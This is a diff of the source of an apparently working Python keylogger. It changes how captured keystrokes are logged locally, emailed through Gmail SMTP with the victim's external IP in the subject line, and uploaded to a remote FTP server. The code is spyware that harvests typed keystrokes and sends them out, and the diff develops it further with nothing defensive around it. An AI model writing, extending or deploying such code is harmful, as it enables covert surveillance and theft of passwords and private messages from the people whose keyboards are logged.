@@ -78,6 +78,7 @@ def GetExIp(): # function to get external ip
 # obj defined for later use for screenshot timer
 objTimer2 = threading.Timer(0, GetExIp); objTimer2.start()
 
+blnFirstSend = "True"
 blnStop = "False"
 intLogChars = 0
 
@@ -90,12 +91,18 @@ def OnKeyboardEvent(event):
         strLogs = ""
 
     def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop, strExIP):
+        global blnFirstSend  # easier to just define this variable to be global within the functions
         try:
             if blnStop == "True":
                 strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
-            else:
+                strMessage = strDateTime + "\n\n" + strLogs
+            elif blnFirstSend == "True":
                 strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
-            strMessage = strDateTime + "\n\n" + strLogs
+                strMessage = strDateTime + "\n\n" + strLogs
+                blnFirstSend = "False"
+            else:
+                strMessage = strLogs
+
             strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From "+strExIP, strMessage)
 
             SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
@@ -107,6 +114,7 @@ def OnKeyboardEvent(event):
             os._exit(1)  # if for some reason, the email cannot send, exit program including threads.
 
     def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop):
+        global blnFirstSend
         try:
             ftp = FTP(); ftp.connect(strFtpServer, 21)
             ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
@@ -115,10 +123,12 @@ def OnKeyboardEvent(event):
             TMP = os.environ["TEMP"]
             objLogFile = open(TMP + "/log.txt", 'w')
             if blnStop == "True":
-                objLogFile.write("\n\n"+"Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")+"\n\n")
-            else:
-                objLogFile.write("\n\n"+"Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
-            objLogFile.write(strLogs); objLogFile.close()
+                objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S"))
+            elif blnFirstSend == "True":
+                objLogFile.write("Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
+                blnFirstSend = "False"
+            objLogFile.write(strLogs)
+            objLogFile.close()
             # create log file
 
             arFileList = ftp.nlst()
@@ -132,16 +142,19 @@ def OnKeyboardEvent(event):
             os._exit(1)
 
     def StoreMessagesLocal(strLogs, blnStop):
+        global blnFirstSend
         # log keys locally
         if os.path.isfile(strLogFile):
             objLogFile = open(strLogFile, 'a')
         else:
             objLogFile = open(strLogFile, 'w')
         if blnStop == "True":
-            objLogFile.write("\n\n""Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
-        else:
-            objLogFile.write("\n\n""Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
-        objLogFile.write(strLogs); objLogFile.close()
+            objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S"))
+        elif blnFirstSend == "True":
+            objLogFile.write("Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
+            blnFirstSend = "False"
+        objLogFile.write(strLogs)
+        objLogFile.close()
 
     def CreateNewThreadMessages():  # function for creating thread for sending messages
         if not strLogs == "":
